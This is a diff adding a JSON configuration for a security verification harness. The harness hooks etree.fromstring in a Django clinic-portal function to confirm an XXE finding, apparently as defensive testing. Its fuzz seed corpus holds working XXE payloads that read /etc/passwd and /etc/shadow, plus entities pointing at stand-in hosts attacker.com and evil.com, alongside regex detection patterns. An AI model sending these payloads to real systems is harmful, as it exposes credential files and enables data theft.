@@ -1,0 +1,51 @@
+{
+  "monitor": {
+    "strategy": "recorded_call",
+    "patch_target": "clinic_portal.patient_operations.etree.fromstring",
+    "target_arg_index": 0,
+    "target_arg_name": null,
+    "capture_what": "XML bytes/string passed to etree.fromstring from request.body",
+    "additional_imports": []
+  },
+  "oracle_check": {
+    "condition_description": "The captured XML payload contains a DOCTYPE declaration with an ENTITY definition using SYSTEM or PUBLIC to reference external resources, indicating XXE exploitation",
+    "trigger_patterns": [
+      "<!DOCTYPE[\\s\\S]*?<!ENTITY[\\s\\S]*?SYSTEM",
+      "<!DOCTYPE[\\s\\S]*?<!ENTITY[\\s\\S]*?PUBLIC",
+      "<!ENTITY\\s+%\\s+\\S+\\s+SYSTEM",
+      "SYSTEM\\s+[\"']file://",
+      "SYSTEM\\s+[\"']http"
+    ],
+    "raise_type": "RuntimeError",
+    "raise_message_template": "PY_XXE: XXE payload detected in etree.fromstring — captured={captured} pattern={matched_pattern}"
+  },
+  "fuzz_guidance": {
+    "seed_corpus": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><root>&xxe;</root>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://evil.com/dtd\">%dtd;]><root>test</root>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC \"foo\" \"file:///etc/hostname\">]><root>&xxe;</root>",
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>"
+    ],
+    "skip_condition": "len(request.body) < 15"
+  },
+  "_meta": {
+    "function": "patient_xml_fold_453",
+    "file": "clinic_portal/patient_operations.py",
+    "input_strategy": "direct_params",
+    "function_signature": "def patient_xml_fold_453(request)",
+    "tainted_params": [
+      {
+        "name": "request",
+        "index": 0,
+        "type": "django.http.HttpRequest"
+      }
+    ],
+    "target_id": "py_xxe_clinic_portal_patient_operations_py_188",
+    "finding_id": "2",
+    "rule_id": "py/xxe",
+    "rule_slug": "py_xxe",
+    "model": "openai/glm-5-turbo",
+    "source_finding_artifact": "output/python/vc-claude-code-seeded-v2-healthcare-clinic-django/verification_results/findings/finding_2_py_xxe.json"
+  }
+}
